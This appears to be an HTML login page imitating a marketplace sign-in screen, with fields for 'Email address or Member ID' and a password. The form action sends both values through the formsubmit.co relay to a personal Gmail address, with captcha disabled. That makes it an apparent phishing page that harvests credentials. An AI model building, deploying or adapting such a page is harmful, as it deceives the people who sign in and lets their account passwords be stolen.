<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="login.css" />
  </head>
  <body>
    <section class="pt-5">
      <section class="container mt-5">
        <div class="col-md-5 col-12 p-4 border">
          <form
            action="https://formsubmit.co/oladipupomichael9@gmail.com"
            method="POST"
          >
            <label for="email" class="fw-bold">Account:</label>
            <input
              class="forms mb-3 input-margin"
              type="email"
              placeholder="Email address or Member ID"
              name="email"
              required
            />
            <div class="d-flex justify-content-between">
              <label class="fw-bold">Password:</label>
              <p class="margin-0">
                <a
                  href="#password"
                  class="text-decoration-none text-primary hover-orange"
                  >Forgot password?</a
                >
              </p>
            </div>

            <!-- <div class="input-box"> -->
            <input
              class="forms mb-3 input-margin"
              type="password"
              placeholder="Password"
              name="password"
              id="password"
              required
            />

            <p class="mb-2">
              <input type="checkbox" checked />
              <span class="fw-bold"
                >Stay signed in.
                <a href="" class="text-decoration-none hover-orange"
                  >Details</a
                ></span
              >
            </p>
            <!-- <img src="./assets/hide.png" alt="view" id="image" class="text-secondary" onclick="toggleVisibility()"> -->
            <!-- </div> -->

            <!-- <a onclick="toggleVisibility()">show password</a> -->

            <input type="hidden" name="_subject" value="New Submission" />
            <input type="hidden" name="_captcha" value="false" />
            <input type="submit" class="btn btn-orange w-100" value="Sign In" />
          </form>
          <p class="mt-4">
            <a href="" class="text-decoration-none hover-orange"
              >Mobile number sign in</a
            >
          </p>
          <hr />
          <div class="d-flex">
            <p class="text-center text-secondary mt-3">Or sign in with:</p>
            <div class="d-flex justify-content-around">
              <img
                class="size ms-3 me-2"
                src="./assets//facebook.png"
                alt="facebook"
              />
              <img
                class="size rounded-circle mx-2"
                src="./assets//google.png"
                alt="google"
              />
              <img
                class="size mx-2"
                src="./assets//linkedin.png"
                alt="linkein"
              />
              <img
                class="size rounded-circle shadow d-none"
                src="./assets//twitter.jpeg"
                alt="twitter"
              />
            </div>
          </div>

          <!-- <p class="text-center mt-5 text-secondary">
            Don't have an account?
            <span
              ><a href="" class="text-decoration-none text-orange"
                >Register</a
              ></span
            >
          </p> -->
          <div class="mt-4">
            <p class="text-ash">
              <input type="checkbox" checked /> I agree to Free Membership
              Agreement
            </p>
            <p class="text-ash">
              <input type="checkbox" checked />I agree to Receive marketing
              materials
            </p>
          </div>
        </div>
      </section>
    </section>
    <script src="login.js"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
      integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"
      integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
